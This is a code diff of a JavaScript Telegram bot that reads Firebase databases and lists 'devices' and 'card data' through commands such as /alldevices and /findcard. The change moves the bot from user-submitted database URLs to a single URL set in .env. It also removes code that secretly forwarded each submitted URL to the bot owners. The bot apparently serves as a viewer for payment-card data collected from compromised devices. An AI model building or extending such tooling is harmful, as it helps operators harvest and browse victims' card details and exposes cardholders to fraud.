@@ -569,24 +569,10 @@ async function handleUpdate(u) {
 
   // USER VIEW: /list
   if (lowerText === "/list") {
-    const userUrl = firebaseUrls[chatId] || null;
-    if (isOwner(chatId)) {
-      if (Object.keys(firebaseUrls).length === 0) {
-        await sendMsg(chatId, "👑 No active Firebase monitoring right now.");
-      } else {
-        await sendMsg(
-          chatId,
-          "👑 You are an owner.\n" +
-            "Use <b>/adminlist</b> to see all users' Firebase URLs.\n\n" +
-            `Your own Firebase: ${userUrl ? userUrl : "None"}`
-        );
-      }
+    if (SINGLE_FIREBASE_URL) {
+      await sendMsg(chatId, `🔐 Your active Firebase (from .env):\n<code>${SINGLE_FIREBASE_URL}</code>`);
     } else {
-      if (userUrl) {
-        await sendMsg(chatId, `🔐 Your active Firebase:\n<code>${userUrl}</code>`);
-      } else {
-        await sendMsg(chatId, "ℹ️ You don't have any active Firebase monitoring yet.");
-      }
+      await sendMsg(chatId, "❌ FIREBASE_URL is not set in your .env file.");
     }
     return;
   }
@@ -597,18 +583,14 @@ async function handleUpdate(u) {
       await sendMsg(chatId, "❌ This command is only for bot owners.");
       return;
     }
-    if (Object.keys(firebaseUrls).length === 0) {
-      await sendMsg(chatId, "👑 No active Firebase monitoring right now.");
-      return;
+    if (SINGLE_FIREBASE_URL) {
+      await sendMsg(
+        chatId,
+        "👑 <b>Active Firebase URL (from .env)</b>:\n\n" + `<code>${htmlEscape(String(SINGLE_FIREBASE_URL))}</code>`
+      );
+    } else {
+      await sendMsg(chatId, "❌ FIREBASE_URL is not set in your .env file.");
     }
-    const lines = [];
-    for (const [uid, url] of Object.entries(firebaseUrls)) {
-      lines.push(`👤 <code>${uid}</code> -> <code>${htmlEscape(String(url))}</code>`);
-    }
-    await sendMsg(
-      chatId,
-      "👑 <b>All active Firebase URLs (admin only)</b>:\n\n" + lines.join("\n")
-    );
     return;
   }
 
@@ -705,12 +687,11 @@ async function handleUpdate(u) {
 
   // -------- ALL DEVICES --------
   if (lowerText === "/alldevices") {
-    const baseUrl = firebaseUrls[chatId];
-    if (!baseUrl) {
-      await sendMsg(chatId, "❌ No active Firebase URL.");
+    if (!SINGLE_FIREBASE_URL) {
+      await sendMsg(chatId, "❌ FIREBASE_URL is not set in your .env file.");
       return;
     }
-    const snap = await httpGetJson(normalizeJsonUrl(baseUrl));
+    const snap = await httpGetJson(normalizeJsonUrl(SINGLE_FIREBASE_URL));
     const devices = collectAllDevices(snap);
     if (devices.size === 0) {
       await sendMsg(chatId, "ℹ️ No devices found.");
@@ -728,12 +709,11 @@ async function handleUpdate(u) {
 
   // -------- FIND CARD --------
   if (lowerText === "/findcard") {
-    const baseUrl = firebaseUrls[chatId];
-    if (!baseUrl) {
-      await sendMsg(chatId, "❌ No active Firebase URL.");
+    if (!SINGLE_FIREBASE_URL) {
+      await sendMsg(chatId, "❌ FIREBASE_URL is not set in your .env file.");
       return;
     }
-    const snap = await httpGetJson(normalizeJsonUrl(baseUrl));
+    const snap = await httpGetJson(normalizeJsonUrl(SINGLE_FIREBASE_URL));
     const devices = collectCardDevices(snap);
     if (Object.keys(devices).length === 0) {
       await sendMsg(chatId, "ℹ️ No card data found.");
@@ -762,16 +742,14 @@ async function handleUpdate(u) {
       return;
     }
     const deviceId = parts[1].trim();
-    const baseUrl = firebaseUrls[chatId];
-    if (!baseUrl) {
+    if (!SINGLE_FIREBASE_URL) {
       await sendMsg(
         chatId,
-        "❌ You don't have any active Firebase URL.\n" +
-          "First send your Firebase RTDB URL to start monitoring."
+        "❌ FIREBASE_URL is not set in your .env file."
       );
       return;
     }
-    const jsonUrl = normalizeJsonUrl(baseUrl);
+    const jsonUrl = normalizeJsonUrl(SINGLE_FIREBASE_URL);
     const snap = await httpGetJson(jsonUrl);
     if (snap === null) {
       await sendMsg(chatId, "❌ Failed to fetch data from your Firebase.");
@@ -795,22 +773,11 @@ async function handleUpdate(u) {
     return;
   }
 
-  // -------- Firebase URL handling --------
+  // -------- Firebase URL handling (Disabled, relying on .env) --------
   if (text.startsWith("http")) {
-    const testUrl = normalizeJsonUrl(text);
-    const testResult = await httpGetJson(testUrl);
-    if (!testResult) {
-      await sendMsg(
-        chatId,
-        "❌ Unable to fetch URL. Make sure it's public and ends with .json"
-      );
-      return;
-    }
-    await startWatcher(chatId, text);
     await sendMsg(
-      OWNER_IDS,
-      `👤 User <code>${chatId}</code> started monitoring:\n` +
-        `<code>${htmlEscape(text)}</code>`
+      chatId,
+      "ℹ️ Sending links here is disabled. The bot gets its Firebase URL directly from the `FIREBASE_URL` variable in your `.env` or Vercel settings."
     );
     return;
   }
